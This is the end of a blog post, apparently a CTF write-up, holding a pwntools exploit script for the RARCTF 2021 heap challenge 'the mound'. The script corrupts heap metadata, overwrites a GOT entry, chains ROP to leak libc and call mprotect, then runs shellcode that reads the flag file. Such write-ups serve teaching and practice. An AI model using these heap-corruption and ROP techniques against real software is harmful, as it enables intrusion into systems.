</span></span><span class=line><span class=cl><span class=n>mound_data</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;beef&#39;</span><span class=p>,</span> <span class=s1>&#39;base mcache fakechunk dents shellcode&#39;</span><span class=p>)(</span><span class=n>BEEF</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10000</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x190</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fake_mcache_entry</span><span class=p>(</span><span class=n>sz</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>fd</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>rid</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>mcache</span><span class=o>=</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rid</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>rid</span> <span class=o>=</span> <span class=n>r64</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>fit</span><span class=p>(</span><span class=n>rid</span><span class=p>,</span> <span class=n>sz</span><span class=p>,</span> <span class=n>mcache</span><span class=p>,</span> <span class=n>fd</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>first_alloc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>fake_mcache_entry</span><span class=p>(</span><span class=n>sz</span><span class=o>=</span><span class=n>midx2csize</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>fakechunk</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>overflower</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=c1># chunk to be overflowed</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>):</span> <span class=n>r64bit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>O_DIRECTORY</span><span class=p>,</span> <span class=n>FLAG_LEN</span> <span class=o>=</span> <span class=mh>0x10000</span><span class=p>,</span> <span class=mi>100</span> <span class=c1># use reasonably long values here</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span> <span class=c1># step 1: getting a directory listing</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>pushstr</span><span class=p>(</span><span class=s1>&#39;/pwn&#39;</span><span class=p>)</span> <span class=c1># put &#34;/pwn&#34; on the stack</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=n>O_DIRECTORY</span><span class=p>)</span> <span class=c1># use openat in lieu of open. rsp because of pushstr</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov QWORD PTR [</span><span class=si>{}</span><span class=s1>], rax</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>)</span> <span class=c1># Store the resultant fd _somewhere_ accessible (mound_data.base)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>getdents64</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_data</span><span class=o>.</span><span class=n>dents</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>)</span> <span class=c1># use getdents to list directory</span>
</span></span><span class=line><span class=cl><span class=c1># step 2: loop through the dents data to find the flag filename</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>mov</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_data</span><span class=o>.</span><span class=n>dents</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;loop:</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;inc rax</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;cmp DWORD PTR [rax], </span><span class=si>{}</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>u32</span><span class=p>(</span><span class=s1>&#39;.txt&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;jne loop</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;lea rbx, [rax-0x20]</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov rax, QWORD PTR [</span><span class=si>{}</span><span class=s1>]</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rbx&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_arena</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>mound_arena</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span> <span class=c1># don&#39;t call asm() twice</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=o>+</span><span class=n>csize2midx</span><span class=p>(</span><span class=n>request2size</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>))),</span> <span class=mi>8</span><span class=p>,</span> <span class=n>sc</span><span class=p>)</span> <span class=c1># dump shellcode somewhere in mound_data for later use</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span> <span class=n>r64bit</span><span class=p>()</span> <span class=c1># There have been 5 rand64bit() calls so far; account for them.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># The substance of the exploit: getting mcache-&gt;entries[-1] to point to a fake mchunk</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>midx</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>((</span><span class=n>i</span><span class=o>+</span><span class=n>midxs</span><span class=o>.</span><span class=n>entries</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>fakechunk</span><span class=p>))</span> <span class=k>if</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pad</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span> <span class=k>return</span> <span class=n>s</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>),</span> <span class=mh>0xf</span><span class=p>)</span> <span class=c1># Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk.</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>),</span> <span class=mh>0xe</span><span class=p>)</span> <span class=c1># A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>midx</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>pred</span> <span class=o>:=</span> <span class=n>r64bit</span><span class=p>())</span><span class=o>&gt;&gt;</span><span class=mi>56</span><span class=p>:</span> <span class=n>add</span><span class=p>(</span><span class=n>midx</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=mh>0xf</span><span class=p>,</span> <span class=n>pad</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>r64</span><span class=p>())[:</span><span class=mi>7</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mh>0xe</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=mh>0xf</span><span class=p>,</span> <span class=n>pad</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>pred</span><span class=p>)[:</span><span class=mi>7</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>incrementer</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># , free it + a chunk right in front of it, overflow into the real freed chunk&#39;s metadata to</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>bugged</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># Get the fake chunk allocated,</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># free it + the chunk overlapping with the fake chunk</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># prepare to overwrite freed mchunk metadata such that -&gt;next points to a fake chunk on the mound_arena</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>fakechunk</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;overwrite!&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>fake_mcache_entry</span><span class=p>(</span><span class=n>sz</span><span class=o>=</span><span class=mi>999</span><span class=p>,</span> <span class=n>fd</span><span class=o>=</span><span class=n>mound_arena</span><span class=o>.</span><span class=n>mcache</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>overflower</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;hi&#39;</span><span class=p>)</span> <span class=c1># put the fake mound_arena chunk on the mcache</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>overflower</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>,</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;setvbuf&#39;</span><span class=p>]))</span> <span class=c1># replace mound_arena-&gt;top with the GOT</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>got_overwriter</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span> <span class=c1># overwrite a good function with win() (I use scanf() here)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># win() will execute. Leak libc in the first cycle.</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>win</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=mi>6</span><span class=p>],</span> <span class=s1>&#39;all&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Using libc, change 0xbeef* to an rwx page, and jump to the shellcode that was allocated there earlier on.</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>mprotect</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x400000</span><span class=p>,</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1># get flag</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>This isn&rsquo;t meant as an attack against the &lsquo;originality&rsquo; of CTF challenge makers. Good CTF challenge makers have to be CTF players themselves, and where else would you draw inspiration from, if not prior CTFs?</p></li></ol><p>If any part of this writeup was interesting for you, try submitting a comment below; I&rsquo;ve only just added utteranc.es to this site.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on August 20, 2022&nbsp;<a class=git-hash href=https://github.com/152334H/blog/commit/9043fe81da576b575f9034af7e5c6056f051ba22 target=_blank title="commit by 152334H(54623771+152334H@users.noreply.github.com) 9043fe81da576b575f9034af7e5c6056f051ba22: Content push">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>9043fe8</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/ data-title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn" data-hashtags=writeup,pwn><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/ data-hashtag=writeup><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/ data-title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/ data-title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://152334H.github.io/blog/rarctf-2021-the-mound/ data-title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/writeup/>writeup</a>,&nbsp;<a href=/tags/pwn/>pwn</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/blog/redpwn-2021-panda-food/ class=prev rel=prev title="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>C++ Smart Pointer UAFs: redpwn 2021's panda-food</a>
<a href=/blog/encapsulating-dp/ class=next rel=next title="@cache without @cache">@cache without @cache<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://152334H.github.io/ target=_blank>152334H</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{giscus:{category:"Announcements",categoryId:"DIC_kwDOH03r284CQ2Tu",darkTheme:"dark_dimmed",emitMetadata:"0",inputPosition:"bottom",lang:"en",lazyLoading:!1,lightTheme:"light",mapping:"pathname",reactionsEnabled:"1",repo:"152334H/152334h.github.io",repoId:"R_kgDOH03r2w"}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},twemoji:!0}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-W0STJ4D3N3",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-W0STJ4D3N3" async></script></body></html>